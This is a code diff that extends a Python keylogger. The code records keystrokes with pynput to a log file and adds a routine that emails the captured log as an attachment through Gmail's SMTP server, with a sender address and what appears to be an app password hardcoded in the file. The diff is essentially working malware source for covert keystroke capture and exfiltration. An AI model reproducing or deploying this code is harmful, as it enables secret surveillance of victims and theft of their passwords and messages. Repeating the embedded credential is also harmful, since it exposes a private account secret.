@@ -8,8 +8,6 @@ import smtplib
 import socket
 import platform
 
-# import win32clipboard
-
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
@@ -31,10 +29,51 @@ from PIL import ImageGrab
 key_info = r"/key_log.txt"
 log_dir = r"/Users/kenluong/Developer/python/"
 
-logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+email_addr = "anteikuu20@gmail.com"
+password = "erfe mdvm mnck pghf"
+toaddr = "anteikuu20@gmail.com"
+
+keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
 def on_press(key):
     logging.info(str(key))
 
-with Listener(on_press=on_press) as listener:
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_addr
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_email"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(part)
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(fromaddr, password)
+    text = msg.as_string()
+
+    server.sendmail(fromaddr, toaddr, text)
+    server.quit()
+
+send_email(key_info, log_dir + key_info, toaddr)
